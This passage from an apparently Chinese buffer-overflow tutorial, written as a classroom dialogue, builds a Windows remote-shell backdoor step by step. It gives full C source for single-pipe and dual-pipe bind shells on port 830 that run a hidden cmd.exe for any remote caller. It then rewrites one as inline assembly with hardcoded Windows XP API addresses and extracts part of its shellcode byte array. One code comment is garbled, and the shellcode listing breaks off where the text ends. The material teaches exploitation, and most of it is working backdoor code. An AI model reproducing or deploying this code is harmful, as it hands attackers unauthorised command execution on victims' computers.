老师说：“好的。大家想的这两种方法，思路上都差不多，我们一起来看看它们的实现吧！”

# 3.3.1 双管道后门的实现

### 3.3.1 双管道后门的实现

老师说，“我们首先看看两个匿名管道情况的实现方法。”

“有实现的思路和网络通信编程的基础，理解起来还是比较容易。”

“首先是初始化 Socket，然后 Bind 端口，再监听 Listen，直到有客户请求，就 Accept 请求。示意代码如下：”

```
//初始化 wsa
     WSAStartup(MAKEWORD(2,2),&ws);
     //建立 socket
     listenFD = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
     ret=bind(listenFD,(sockaddr *)&server,sizeof(server));
     ret=listen(listenFD,2);
SOCKET clientFD=accept(listenFD,(sockaddr *)&server,&iAddrSize); 
```

“然后创立两个 Pipe，第一个管道用于输出执行结果，第二个管道用于输入命令。”

```
CreatePipe(&hReadPipe1,&hWritePipe1,&pipeattr1,0);
CreatePipe(&hReadPipe2,&hWritePipe2,&pipeattr2,0); 
```

“按照前面的分析，我们把 CMD 子进程输出句柄用管道 1 的写句柄替换，和前面一样，主进程就可以通过读管道 1 的读句柄来获得输出；另外，我们还要把 CMD 子进程的输入句柄用 2 的读句柄替换，主进程就可以通过写管道 2 的写句柄来输入命令。如图 3－19。”

![](img/Q 版缓冲区溢出教程 82593.jpg)

“这里比较麻烦，我再讲一次，其通信过程如下：”

```
(远程主机)←输入←管道 1 输出←管道 1 输入←输出(cmd.exe 子进程)
(远程主机)→输出→管道 2 输入→管道 2 输出→输入(cmd.exe 子进程) 
```

“为了得到这样的效果，我们设置 CMD 子进程启动参数‘si’为如下：”

```
si.hStdInput = hReadPipe2;
si.hStdOutput = si.hStdError = hWritePipe1; 
```

“就是替换进程的输出句柄为管道 1 的写句柄，输入句柄为管道 2 的读句柄。最后再开启 CMD 命令就可以了。”

```
CreateProcess(NULL,cmdLine,NULL,NULL,1,0,NULL,NULL,&si,&ProcessInformation) 
```

“CMD 子进程启动后，就要和远程攻击机之间通信，传输用户的命令和结果。实现是先检查管道 1，即 CMD 进程是否有输出。如果有，就读出来发给远程客户机；如果没有，就接收远程客户机的命令，并写入管道 2，即传给 CMD 进程中。代码如下：”

```
//检查管道 1，即 CMD 进程是否有输出
ret=PeekNamedPipe(hReadPipe1,Buff,1024,&lBytesRead,0,0);
         if(lBytesRead)
         {
              //管道 1 有输出，读出结果发给远程客户机
              ret=ReadFile(hReadPipe1,Buff,lBytesRead,&lBytesRead,0);
              if(!ret) break;
              ret=send(clientFD,Buff,lBytesRead,0);
              if(ret<=0) break;
         }
else
         {
              //否则，接收远程客户机的命令
              lBytesRead=recv(clientFD,Buff,1024,0);
              if(lBytesRead<=0) break;
              //将命令写入管道 2，即传给 CMD 进程
              ret=WriteFile(hWritePipe2,Buff,lBytesRead,&lBytesRead,0);
              if(!ret) break;
         } 
```

“把它们合起来，就得到程序 pipe2.cpp，如下：”

```
#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib,"Ws2_32")
 int main()
{
     WSADATA ws;
     SOCKET listenFD;
     char Buff[1024];
     int ret;
      //初始化 wsa
     WSAStartup(MAKEWORD(2,2),&ws);
     //建立 Socket
     listenFD = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
     //监听本机 830 端口
     struct sockaddr_in server;
     server.sin_family = AF_INET;
     server.sin_port = htons(830);
     server.sin_addr.s_addr=ADDR_ANY;
     ret=bind(listenFD,(sockaddr *)&server,sizeof(server));
     ret=listen(listenFD,2);
     //如果客户请求 830 端口，接受连接
     int iAddrSize = sizeof(server);
     SOCKET clientFD=accept(listenFD,(sockaddr *)&server,&iAddrSize);
     SECURITY_ATTRIBUTES pipeattr1, pipeattr2;
     HANDLE hReadPipe1,hWritePipe1,hReadPipe2,hWritePipe2;
     //建立匿名管道 1
     pipeattr1.nLength = 12; 
     pipeattr1.lpSecurityDescriptor = 0;
     pipeattr1.bInheritHandle = true;
     CreatePipe(&hReadPipe1,&hWritePipe1,&pipeattr1,0);
     //建立匿名管道 2
     pipeattr2.nLength = 12; 
     pipeattr2.lpSecurityDescriptor = 0;
     pipeattr2.bInheritHandle = true;
     CreatePipe(&hReadPipe2,&hWritePipe2,&pipeattr2,0);
     STARTUPINFO si;
     ZeroMemory(&si,sizeof(si));
     si.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
     si.wShowWindow = SW_HIDE;
     si.hStdInput = hReadPipe2;
     si.hStdOutput = si.hStdError = hWritePipe1;
     char cmdLine[] = "cmd.exe";
     PROCESS_INFORMATION ProcessInformation;
     //建立进程    
ret=CreateProcess(NULL,cmdLine,NULL,NULL,1,0,NULL,NULL,&si,&ProcessInformation);
     /*
     解释一下，这段代码创建了一个 cmd.exe，把 cmd.exe 的标准输出和标准错误输出用第一个管道的写句柄替换；cmd.exe 的标准输入用第二个管道的读句柄替换。
     如下：
      (远程主机)←输入←管道 1 输出←管道 1 输入←输出(cmd.exe 子进程)
     (远程主机)→输出→管道 2 输入→管道 2 输出→输入(cmd.exe 子进程) 
     */
     unsigned long lBytesRead;
     while(1)
     {
         //检查管道 1，即 CMD 进程是否有输出
         ret=PeekNamedPipe(hReadPipe1,Buff,1024,&lBytesRead,0,0);
         if(lBytesRead)
         {
              //管道 1 有输出，读出结果发给远程客户机
              ret=ReadFile(hReadPipe1,Buff,lBytesRead,&lBytesRead,0);
              if(!ret) break;
              ret=send(clientFD,Buff,lBytesRead,0);
              if(ret<=0) break;
         }
         else
         {
              //否则，接收远程客户机的命令
              lBytesRead=recv(clientFD,Buff,1024,0);
              if(lBytesRead<=0) break;
              //将命令写入管道 2，即传给 cmd 进程
              ret=WriteFile(hWritePipe2,Buff,lBytesRead,&lBytesRead,0);
              if(!ret) break;
         }
     }
     return 0;
} 
```

“我们执行 pipe2.cpp，本机就会打开 830 端口监听。如果其他机器 Telnet IP 830 ，就会给它一个远程的 Shell，可以在那个 Shell 下输入命令执行，如图 3－20。”

![](img/Q 版缓冲区溢出教程 86296.jpg)

“哦，好可爱的 Shell 啊！真想咬一口。”玉波说道。

“你怎么老想到吃啊……”

“哈哈……”大家都笑了，整个课堂气氛更加融洽。

“那单管道的后门又是怎样实现的呢？”古风又心急的问。

“好，我们也一起来看看吧！”

# 3.3.2 单管道后门的实现

### 3.3.2 单管道后门的实现

“有了双管道后门的实现基础，单管道后门的实现就简单了。我们只看不同的地方。”老师在黑板上写出来。“和双管道不同的地方就是：只建一个管道，然后将 CMD 子进程的输出句柄用管道的写句柄替换，如下：”

```
CreatePipe(&hReadPipe1,&hWritePipe1,&pipeattr1,0);
si.hStdOutput = si.hStdError = hWritePipe1; 
```

“传输用户的命令和结果，先检查管道里有没有输出数据，如有，就将数据读出并发送给客户机；如果没有，就接收远程客户机的命令数据，把命令数据和 cmd /c 合起来，作为参数开启一个新的 CMD 子进程。代码如下：”

```
ret=PeekNamedPipe(hReadPipe1,Buff,1024,&lBytesRead,0,0);
         if(lBytesRead)
         {
              //管道 1 有输出，读出结果发给远程客户机
              ret=ReadFile(hReadPipe1,Buff,lBytesRead,&lBytesRead,0);
              if(!ret) break;
              ret=send(clientFD,Buff,lBytesRead,0);
              if(ret<=0) break;
         }
         else
         {
              //否则，接收远程客户机的命令
              lBytesRead=recv(clientFD,Buff,1024,0);
              if(lBytesRead<=0) break;
              strcpy(cmdLine, "cmd.exe /c");            //cd\ & dir
              strncat(cmdLine, Buff, lBytesRead);
              //以命令为参数，启动 CMD 执行
                          CreateProcess(NULL,cmdLine,NULL,NULL,1,0,NULL,NULL,&si,&ProcessInformation);
         } 
```

“注意，这里的 cmd /c 意思是命令执行完毕后，退出 DOS 窗口程序。”老师提醒道，“测试时我们将会深刻理解它的意思。”

“我们把程序连起来，接收远程命令数据→开进程执行→读出并传回，形成不断的循环，最后再加入错误处理代码，就是一个单管道的 Telnet 后门了。”

```
#include <winsock2.h>
#include <stdio.h>
#include <string.h>
#pragma comment(lib,"Ws2_32")
int main()
{
     WSADATA ws;
     SOCKET listenFD;
     char Buff[1024];
     int ret;
     //初始化 wsa
     WSAStartup(MAKEWORD(2,2),&ws);
     //建立 socket
     listenFD = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
     //监听本机 830 端口
     struct sockaddr_in server;
     server.sin_family = AF_INET;
     server.sin_port = htons(830);
     server.sin_addr.s_addr=ADDR_ANY;
     ret=bind(listenFD,(sockaddr *)&server,sizeof(server));
     ret=listen(listenFD,2);
     //如果客户请求 830 端口，接受连接
     int iAddrSize = sizeof(server);
     SOCKET clientFD=accept(listenFD,(sockaddr *)&server,&iAddrSize);
     SECURITY_ATTRIBUTES pipeattr1;
     HANDLE hReadPipe1,hWritePipe1;
     //建立匿名管道 1
     pipeattr1.nLength = 12; 
     pipeattr1.lpSecurityDescriptor = 0;
     pipeattr1.bInheritHandle = true;
     CreatePipe(&hReadPipe1,&hWritePipe1,&pipeattr1,0);
     STARTUPINFO si;
     ZeroMemory(&si,sizeof(si));
     si.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
     si.wShowWindow = SW_HIDE;
     //si.hStdInput = hReadPipe2;
     si.hStdOutput = si.hStdError = hWritePipe1;
     PROCESS_INFORMATION ProcessInformation;
     char cmdLine[200];
     unsigned long lBytesRead;
     /*
     以命令为参数运行 cmd.exe
     (远程主机→传送命令－→以命令为参数建立 cmd.exe 子进程运行
     (远程主机)←输入→管道 1 输出→管道 1 输入→输出(cmd.exe 子进程)
     */
     while(1)
     {
         //检查管道 1，即 cmd 进程是否有输出
         ret=PeekNamedPipe(hReadPipe1,Buff,1024,&lBytesRead,0,0);
         if(lBytesRead)
         {
              //管道 1 有输出，读出结果发给远程客户机
              ret=ReadFile(hReadPipe1,Buff,lBytesRead,&lBytesRead,0);
              if(!ret) break;
              ret=send(clientFD,Buff,lBytesRead,0);
              if(ret<=0) break;
         }
         else
         {
              //否则，接收远程客户机的命令
              lBytesRead=recv(clientFD,Buff,1024,0);
              if(lBytesRead<=0) break;
              strcpy(cmdLine, "cmd.exe /c");            //cd\ & dir
              strncat(cmdLine, Buff, lBytesRead);
               //以命令为参数，合成后启动 CMD 执行
CreateProcess(NULL,cmdLine,NULL,NULL,1,0,NULL,NULL,&si,&ProcessInformation);
         }
     }
     return 0;
} 
```

“哦，测试一下！”大家都想看效果。

“好的，我们测试一下，定义监听的端口是 830，执行后再在另一台机器上 Telnet IP 830 ，这样就可执行任意命令了，如图 3－21。”

![](img/Q 版缓冲区溢出教程 89907.jpg)

“哦，好呢！”大家忙着敲入几个命令，然后有人说道：“啥提示符都没有……”

“哎哟，没提示符是小事，怎么执行 cd/ 命令没有效果呢？”古风说，“用 dir 命令始终是在这个目录下。”

大家一实践，都发现了。“是啊！好奇怪啊！”

宇强说：“我试试双管道的程序。”操作一番后，宇强说，“双管道是正常的啊！”

“哦？那这是怎么回事啊？”大家都望着老师。

“呵呵！我说过实践的时候大家就会发现问题……”

“啊？莫非是那个 cmd /c 参数的问题?” 宇强想了起来。

“对！”老师说道，“我们输入 cmd /? 后，就会出现图 3－22 所示的帮助。”

![](img/Q 版缓冲区溢出教程 90188.jpg)

“哇！cmd 命令有这么多参数和作用啊？”

“是的，所以像函数和程序具体的用法，我们在使用时查帮助和手册就可以了。我们人类的大脑可不是用来记这个的。大家看看帮助里面是怎么解释的吧！”

“ cmd /c ，执行字符串指定的命令然后中断。”大家念道。

宇强一下叫了起来：“哦！我明白了！”

“什么？快说，快说！”其他人催促道。

“大家想想啊，‘/c’是执行完命令后就中断，我们执行 cd/ 命令后，子进程就没了。下一次的 dir 命令是新一个 CMD 进程执行的，那当然又是默认目录了！”

“对啊！”其他人一下明白了，“一个子进程只执行一次命令，这就是单管道的特点啊！”

“那我们想执行 cd/ 命令后再执行 dir 怎么办呢？”小倩也问道，“没有办法了吗？”

老师说：“也有办法的。在 DOS 下，‘&’可以把几个命令合起来。所以我们可以这样输入命令： cd/ & dir 。这样，CMD 就会先执行 cd/ 命令，然后执行 dir 命令，最后再退出。”

“试一下。”大家边说边试。“啪”！显示出了 F 盘下的文件。

“哦！果然成功了！”

“太好了！”大家都情不自禁的鼓起掌来。

# 3.4 生成 ShellCode

## 3.4 生成 ShellCode

“好，功能实现了，但不要忘了我们的目的。把它转化成我们想要的 ShellCode 吧！”老师说道。

“好啊！”大家又是一阵欢呼。

“汇编编写和 ShellCode 的提取，都以上周的课为基础。记不清楚的同学，先翻翻 ShellCode 编写基础的笔记吧！”

# 3.4.1 转换成汇编

### 3.4.1 转换成汇编

老师说：“我们还是和以前一样，先根据功能写出汇编，再提取 ShellCode。”

“哦，这样有点麻烦！”玉波有点不情愿。

“虽然这样比较麻烦，但能让我们深刻理解系统是如何执行程序的。以后再讲提取的改进方法吧！”老师说道，“首先，我们把双管道后面程序 pipe2.cpp 改写成汇编。”

“第一、我们先不考虑通用性。把所有要使用的函数地址都找出来，修改那个地址查找程序——GetAddr.cpp，查找 pipe2.cpp 中要用的函数地址。在 Windows XP SP0 下，程序 GetBindAddr.cpp 的执行结果如图 3－23。”

![](img/Q 版缓冲区溢出教程 91106.jpg)

“这里改成用 XP 系统了啊？”大家觉得奇怪，“之前都是 Windows 2000 的嘛！”

“这里换个系统，是不要让大家对系统版本有依赖性。其实，前面我们讨论的方法都是通用的。”老师说道，“所以无论是 Win2000 还是 XP，除地址不同外，后面的方法是完全一样的。好，我们把找到的函数地址抄下来。如下：”

```
CreatePipe = //x77e5727a
CreateProcessA = //x77e41bb8
PeekNamedPipe = //x77e97624
WriteFile = //x77e59d8c
ReadFile = //x77e58b82
ExitProcess = //x77e55cb5
socket = //x71a23c22
bind = //x71a23ece
listen = //x71a25de2
accept = //x71a2868d
send = //x71a21af4
recv = //x71a25690 
```

“在汇编程序中，依次将函数的地址保存如下：”

```
mov eax,0x77e5727a
mov [ebp+4],  eax;     CreatePipe
mov eax,0x77e41bb8
mov  [ebp+8],  eax;  CreateProcessA
mov eax,0x77e97624
mov  [ebp+12], eax;   PeekNamedPipe
mov eax,0x77e59d8c
mov  [ebp+16], eax;   WriteFile
mov eax,0x77e58b82
mov  [ebp+20], eax;   ReadFile
mov eax,0x77e55cb5
mov  [ebp+24], eax;   ExitProcess
mov eax,0x71a241da
mov  [ebp+28], eax;   WSAStartup
mov eax,0x71a23c22
mov  [ebp+32], eax;   socket
mov eax,0x71a23ece
mov  [ebp+36], eax;   bind
mov eax,0x71a25de2
mov  [ebp+40], eax;   listen
mov eax,0x71a2868d
mov  [ebp+44], eax;   accept
mov eax,0x71a21af4
mov  [ebp+48], eax;   send
mov eax,0x71a25690
mov  [ebp+52], eax;   recv 
```

“以后我们如果要换一个系统执行，只需将这里的地址值改一下就行了。”老师说道。

“有没有通用的方法呢？”宇强问，“每次改还是有点麻烦。”

“当然有啦！别急，我们会在以后讲解。”老师笑着说，“而现在，我们仿造 Windows 函数调用的流程，写出我们的汇编代码。”

“由 C 程序得到汇编代码的关键，一是将参数入栈，二是 CALL 调用函数的地址。如果有所遗忘，请大家复习上节课的笔记。”

“源程序的第一句指令，是执行 WSAStartup(0x202, &ws)。我们按照函数调用流程，首先将参数从右至左依次压入栈中。”

“后一个参数是‘&ws’，表示一个地址。因为‘ws’以后不会用了，所以我们就随便压个地址，比如 esp 的值；第一个参数是 0x202，我们直接 push 0x202；因为 WSAStartup 的地址保存在[ebp+28]中，所以我们再 call [ebp+28] 就实现了调用，像下面这样，简单吧！”

```
push esp
push 0x202
call [ebp + 28]              //WSAStartup 地址 
```

“然后 socket(2,1,6) 也类似，先把 6、1、 2 依次入栈，最后 call socket 的地址。”

```
;socket(2,1,6)
push 6
push 1
push 2
call [ebp + 32]
mov ebx, eax                ; save socket to ebx 
```

“怎么知道 socket(AF_INET,SOCK_STREAM,IPPROTO_TCP) 是 socket(2,1,6) 呢？”古风不解的问。

“嗯，第一种方法我们可以查看宏定义里面的值，但比较麻烦；第二种方法就是，我们在 VC 中按 F10 单步调试高级语言写成的 pipe2C.cpp，在执行 socket(AF_INET,SOCK_STREAM,IPPROTO_TCP) 语句时，就可以看到入栈情况。如图 3－24。”

![](img/Q 版缓冲区溢出教程 93103.jpg)

“哦！果然是 6、1、2 依次入栈啊！”大家啧啧称奇。

“这是种很好的方法，”老师说道，“在不知道参数怎么压的时候，就看看高级语言程序是怎么执行的。”

“好，我们继续。bind（）那句高级语言实现如下：”

```
struct sockaddr_in server;
server.sin_family = AF_INET;
server.sin_port = htons(830);
server.sin_addr.s_addr=ADDR_ANY;
ret=bind(listenFD,(sockaddr *)&server,sizeof(server)); 
```

“这个函数有点麻烦，压的参数是怎么得到的呢？”玉波问道。

“我们还是借助于高级语言吧！在对比中学习更利于理解和提高。调试到 bind( )那句函数时，如图 3-25。”

![](img/Q 版缓冲区溢出教程 93475.jpg)

“高级语言执行这句时，首先是 0x10 入栈，说明 sizeof(server)其实就是 0x10。”

“嗯，这个参数简单！”

“第二个参数‘&server’是 sockaddr 结构的地址。在 sockaddr 结构中，包括了绑定的协议、IP、端口号等值。和在堆栈中构造字符串一样，我们也在栈中构造出 sockaddr 的结构，那么 esp 就是 sockaddr 结构的地址了。”

“哎哟，困难来了！字符串的值好构造，但 sockaddr 结构的值在堆栈中怎么赋呢？”古风着急的问。

“呵呵，不要急！我们还是在 C 程序下通过调试观察 sockaddr 赋值的情况吧！如图 3-26。”

![](img/Q 版缓冲区溢出教程 93758.jpg)

“我们来看看执行完对 sockaddr 结构的赋值后 Server 在内存中的值究竟是多少！”

“哦？如何看呢？”

“我们在内存窗口中看。在菜单栏上点鼠标右键，在弹出菜单中选“Debug”就会出现 Debug 工具栏，如图 3-27”

![](img/Q 版缓冲区溢出教程 93874.jpg)

“我们在 Debug 工具栏中点中‘Memory’按钮，如图 3-28。”

![](img/Q 版缓冲区溢出教程 93911.jpg)

“这样就会弹出内存窗口，如图 3-29。我们在内存窗口中输入 server 就会显示出 server 的值：02 00 03 3E 00 00 00 00，看右下方的内存窗口。”

![](img/Q 版缓冲区溢出教程 94000.jpg)

“从图中可看出，如下执行后其实就是得到了 02 00 03 3E 00 00 00 00！” 宇强兴冲冲的说。

```
server.sin_family = AF_INET;    
server.sin_port = htons(830);   
server.sin_addr.s_addr=ADDR_ANY 
```

“对！知道了确切要赋的值，我们就依葫芦画瓢吧！ push 0x0000，push 0x0000，push 0x3E030002 就在堆栈中构造出了 sockaddr 结构的值，而且 esp 就正好是结构的地址。我们把它保存给 esi 作为第二个参数压入堆栈。”

“好了，剩下就轻松了，最后一个参数是‘socket’。上面执行了 socket( )后，我们把 socket 的值保存在了 ebx 中，所以将 ebx 压入就可以了。”

“最后 call 调用函数。bind 函数地址存放在[ebp + 36]中。合起来就像下面这样。”

```
;bind(listenFD,(sockaddr *)&server,sizeof(server));
xor edi,edi            //先构造 server
push edi
push edi
mov eax,0x3E030002
push  eax           ; port 830  AF_INET
mov esi, esp                 //把 server 地址赋给 esi
push  0x10                           ; length
push esi                          ; &server
push ebx                         ; socket
call [ebp + 36]                ; bind 
```

“嗯！有意思！” 玉波咂咂嘴说道。

“ok，理解了思路就很简单吧？”老师说，“后面用同样的方法将各个函数调用完。不知道数据怎么赋值时，就参看 C 程序的执行，可以得到我们的 pipe2ASM.cpp 程序。”

```
__asm
    {
         push ebp;
         sub  esp, 80; 
         mov  ebp,esp;
         //把要用到的函数地址存起来——以下都是 XP SP0
              mov eax,0x77e5727a
              mov [ebp+4],  eax;          CreatePipe
              mov eax,0x77e41bb8
              mov  [ebp+8],  eax;    CreateProcessA
              mov eax,0x77e97624
              mov  [ebp+12], eax;    PeekNamedPipe 
              mov eax,0x77e59d8c
              mov  [ebp+16], eax;    WriteFile
              mov eax,0x77e58b82
              mov  [ebp+20], eax;    ReadFile
              mov eax,0x77e55cb5
              mov  [ebp+24], eax;    ExitProcess
              mov eax,0x71a241da
              mov  [ebp+28], eax;    WSAStartup
              mov eax,0x71a23c22
              mov  [ebp+32], eax;    socket
              mov eax,0x71a23ece
              mov  [ebp+36], eax;    bind
              mov eax,0x71a25de2
              mov  [ebp+40], eax;    listen
              mov eax,0x71a2868d
              mov  [ebp+44], eax;    accept
              mov eax,0x71a21af4
              mov  [ebp+48], eax;    send
              mov eax,0x71a25690
              mov  [ebp+52], eax;    recv
              mov eax,0x0
              mov [ebp+56],0
              mov [ebp+60],0
              mov [ebp+64],0
 mov [ebp+68],0
              mov [ebp+72],0
LWSAStartup:
         ; WSAStartup(0x202, DATA) 
              sub esp, 400
              push esp
              push 0x202
              call [ebp + 28]
socket:
         ;socket(2,1,6)
              push 6
              push 1
              push 2
              call [ebp + 32]
              mov ebx, eax                ; save socket to ebx
LBind:
         ;bind(listenFD,(sockaddr *)&server,sizeof(server));
              xor edi,edi
              push edi
              push edi
              mov eax,0x3E030002
              push  eax     ; port 830  AF_INET
              mov esi, esp
              push  0x10               ; length
              push esi             ; &server
              push ebx             ; socket
              call [ebp + 36]          ; bind
LListen:
         ;listen(listenFD,2)
              inc edi
              inc edi
              push edi           ;2
              push ebx           ;socket
              call [ebp + 40]        ;listen
LAccept:
         ;accept(listenFD,(sockaddr *)&server,&iAddrSize)
              push 0x10
              lea  edi,[esp]
              push edi
              push esi           ;&server
              push ebx           ;socket
              call [ebp + 44]        ;accept
              mov ebx, eax       ;save newsocket to ebx
Createpipe1:
         ;CreatePipe(&hReadPipe1,&hWritePipe1,&pipeattr1,0);
              xor edi,edi
              inc edi
              push edi
              xor edi,edi
              push edi
              push 0xc      ;pipeattr
              mov esi, esp
              push edi      ;0
              push esi      ;pipeattr1
              lea eax, [ebp+60]  ;&hWritePipe1
              push eax
              lea eax, [ebp+56]  ;&hReadPipe1
              push eax
              call [ebp+4]
CreatePipe2:
         ;CreatePipe(&hReadPipe2,&hWritePipe2,&pipeattr2,0);
              push edi      ;0
              push esi      ;pipeattr2
              lea eax,[ebp+68]   ;hWritePipe2
              push eax
              lea eax, [ebp+64]  ;hReadPipe2
              push eax
              call [ebp+4]
CreateProcess:
         ;ZeroMemory TARTUPINFO,10h  PROCESS_INFORMATION  44h
              sub esp, 0x80
              lea edi, [esp]
              xor eax, eax
              push  0x80
              pop ecx
              rep stosd //清空 s?弞,?? i
         ;si.dwFlags
              lea edi,[esp]
              mov eax, 0x0101
              mov [edi+2ch], eax;
         ;si.hStdInput = hReadPipe2 ebp+64
              mov eax,[ebp+64]
              mov [edi+38h],eax
         ;si.hStdOutput si.hStdError = hWritePipe1 ebp+60
              mov eax,[ebp+60]
              mov [edi+3ch],eax
              mov eax,[ebp+60]
              mov [edi+40h],eax
         ;cmd.exe
              mov eax, 0x00646d63    
              mov [edi+64h],eax  ;cmd
         ;CreateProcess(NULL,cmdLine,NULL,NULL,1,0,NULL,NULL,&si,&ProcessInformation)
              lea eax, [esp+44h]
              push eax           ;&pi
              push edi           ;&si
              push ecx           ;0
              push ecx           ;0
              push ecx           ;0
              inc  ecx
              push ecx           ;1
              dec  ecx
              push ecx           ;0
              push ecx           ;0
              lea eax,[edi+64h]  ;"cmd"
              push eax
              push ecx           ;0
              call [ebp+8]
loop1:
         ;while1
         ;PeekNamedPipe(hReadPipe1,Buff,1024,&lBytesRead,0,0);
         sub esp,400h       ;
         mov esi,esp            ;esi = Buff
         xor ecx, ecx
         push ecx           ;0
         push ecx           ;0
         lea edi,[ebp+72]   ;&lBytesRead
         push edi           
         mov eax,400h
         push eax           ;1024
         push esi           ;Buff
         mov eax,[ebp+56]            
         push eax           ;hReadPipe1
         call [ebp+12]
         mov eax,[edi]
         test eax,eax
         jz recv_command
send_result:
         ;ReadFile(hReadPipe1,Buff,lBytesRead,&lBytesRead,0)
         xor ecx,ecx
         push ecx      ;0
         push edi      ;&lBytesRead
         push [edi]         ;hReadPipe1
         push esi      ;Buff
         push [ebp+56] ;hReadPipe1
         call [ebp+20]
         ;send(clientFD,Buff,lBytesRead,0)
         xor ecx,ecx
         push ecx      ;0
         push [edi]         ;lBytesRead
         push esi      ;Buff
         push ebx      ;clientFD
         call [ebp+48]
         jmp loop1
recv_command:
         ;recv(clientFD,Buff,1024,0)
         xor ecx,ecx
         push ecx
         mov eax,400h
         push eax
         push esi
         push ebx
         call [ebp+52]
         //lea ecx,[edi]
         mov [edi],eax
         ;WriteFile(hWritePipe2,Buff,lBytesRead,&lBytesRead,0)
         xor ecx,ecx
         push ecx
         push edi
         push [edi]
         push esi
         push [ebp+68]
         call [ebp+16]
         jmp loop1
end:
     } 
```

“每一个函数的执行都有详细的对应解释，大家下来可对照着参看，”老师说道，“这里我们编译、执行，然后 Telnet 830 端口。效果如图 3－30。”

![](img/Q 版缓冲区溢出教程 101352.jpg)

“哇赛！成功了！纯汇编后门成功了 ！”同学们欢呼到，“太爽了！”

“完成了汇编，那接下来我们应该作什么呢？”老师问道。

“还用说吗？提取 ShellCode 啦！”台下齐声回答。

“对！”

# 3.4.2 看谁抄得快——提取 ShellCode

### 3.4.2 看谁抄得快——提取 ShellCode

“我们还是用老办法，对嵌入的汇编程序 pipe2ASM.cpp 在 VC 下按 F10 进入调试状态，然后调出汇编对应的机器码，如图 3－31。再然后嘛？嘿嘿……”

“知道啦，就是把它们抄下来嘛！”古风说道。

“天啊！这么多啊！”小倩吐了吐舌头。

![](img/Q 版缓冲区溢出教程 101596.jpg)

“好，我们来组织个比赛——看谁抄得快。最先把 ShellCode 正确提取出来的获胜者可以得到一份神秘礼物！”老师说道。

“哦？好啊，好啊！”同学们纷纷拿出纸和笔。

老师发令：“预备！开始！”

台下奋笔疾书，有比赛就是不一样。

“抄完了！”古风最先说道。

过了一会，玉波也说道：“我也抄完了。”

宇强急死了，但他写字写得很慢，只好一笔一划的写下去。

老师等大家都完成得差不多了，说道：“好，大家可能都差不多完成了吧？”

“是啊，手都痛死了。”大家纷纷甩着又红又痛的手。

“哈哈！我第一！”古风一脸的灿烂。

玉波不服气，“那也不一定，如果你写错了一句呢？或者少抄了一句呢？”

“才不会呢！”

大家狂晕……

“不要吵，”老师出来调解，“我们来验证一下吧！”

3.4.3 验证 ShellCode 功能的方法

“提取了 ShellCode 后，怎么验证它是否正确呢？经常有人问如何知道那些 16 进制 ShellCode 的真正功能，这里就说一下。”

“第一种方法，我们打开 VC，新建一个工程和 C 源文件，然后把 ShellCode 拷下来存为一个数组（这里我们先用玉波提取到的 ShellCode 吧）！最后在 main 中添上 ( (void(*)(void)) &shellcode )() ，得到‘testBindCode1.cpp’。”

“ `(( void(*)(void)) &ShellCode)()` 是什么意思？”大家问道。

“ `(( (void(*)(void)) &ShellCode)()` 这句是关键，它把 ShellCode 转换成一个参数为空、返回为空的函数指针，并调用它。执行那一句就相当于执行 ShellCode 数组里的那些数据。”老师解释道。

“要验证 ShellCode 是否正确完成功能，我们直接运行看效果就可以了。编译、执行，ShellCode 打开了 830 端口，可以 telnet 成功，如图 3－32，证明玉波同学的 ShellCode 提取是正确的。”

![](img/Q 版缓冲区溢出教程 102440.jpg)

“哈哈，我是保证质量啊！”玉波笑道。

“我们再看看古风同学提取的 ShellCode 吧！使用第二种方法，在 main 里面直接嵌入汇编语句 lea eax, ShellCode， call eax 。这是先把 ShellCode 的地址给 eax，然后 call eax 跳到 ShellCode 里面去执行。”

```
__asm
{
lea eax, ShellCode
call eax
} 
```

“我们在 main 里加上图 3－33 里的这段汇编，然后执行，还是成功了！说明古风同学提取的也是正确的。”

![](img/Q 版缓冲区溢出教程 102692.jpg)

“哈哈，太好了！我还担心有误呢！”古风笑呵呵的说。

“好，礼物闪亮登场！就是……赠送《Q 版系列图书》一本。”

“哇！这么好啊！”其他人口水都流出来了。

“古风同学和玉波同学都差不多同时完成，而且都正确了。那这样吧，书非借不能读也，你们一人看三天，然后交换，过两个周后给我一个书面学习汇报，行不？”

“行！”两人一口答应，“这样也可以提高效率！”

“好的。其他同学可要加油啊！希望下一次得奖的是你们！”

“另外，两位同学的 ShellCode 在这里，大家可以对照一下。”

```
unsigned char ShellCode[] = 
    "\x55\x83\xEC\x50\x8B\xEC\xB8\x7A\x72\xE5\x77\x89\x45\x04\xB8\xB8"
    "\x1B\xE4\x77\x89\x45\x08\xB8\x24\x76\xE9\x77\x89\x45\x0C\xB8\x8C"
    "\x9D\xE5\x77\x89\x45\x10\xB8\x82\x8B\xE5\x77\x89\x45\x14\xB8\xB5"
    "\x5C\xE5\x77\x89\x45\x18\xB8\xDA\x41\xA2\x71\x89\x45\x1C\xB8\x22"
    "\x3C\xA2\x71\x89\x45\x20\xB8\xCE\x3E\xA2\x71\x89\x45\x24\xB8\xE2"
    "\x5D\xA2\x71\x89\x45\x28\xB8\x8D\x86\xA2\x71\x89\x45\x2C\xB8\xF4"
    "\x1A\xA2\x71\x89\x45\x30\xB8\x90\x56\xA2\x71\x89\x45\x34\xB8\x00"
    "\x00\x00\x00\xC6\x45\x38\x00\xC6\x45\x3C\x00\xC6\x45\x40\x00\xC6"
    "\x45\x44\x00\xC6\x45\x48\x00\x81\xEC\x90\x01\x00\x00\x54\x68\x02"
    "\x02\x00\x00\xFF\x55\x1C\x6A\x06\x6A\x01\x6A\x02\xFF\x55\x20\x8B"
    "\xD8\x33\xFF\x57\x57\xB8\x02\x00\x03\x3E\x50\x8B\xF4\x6A\x10\x56"
    "\x53\xFF\x55\x24\x47\x47\x57\x53\xFF\x55\x28\x6A\x10\x8D\x3C\x24"
    "\x57\x56\x53\xFF\x55\x2C\x8B\xD8\x33\xFF\x47\x57\x33\xFF\x57\x6A"
    "\x0C\x8B\xF4\x57\x56\x8D\x45\x3C\x50\x8D\x45\x38\x50\xFF\x55\x04"
    "\x57\x56\x8D\x45\x44\x50\x8D\x45\x40\x50\xFF\x55\x04\x81\xEC\x80"
    "\x00\x00\x00\x8D\x3C\x24\x33\xC0\x68\x80\x00\x00\x00\x59\xF3\xAB"
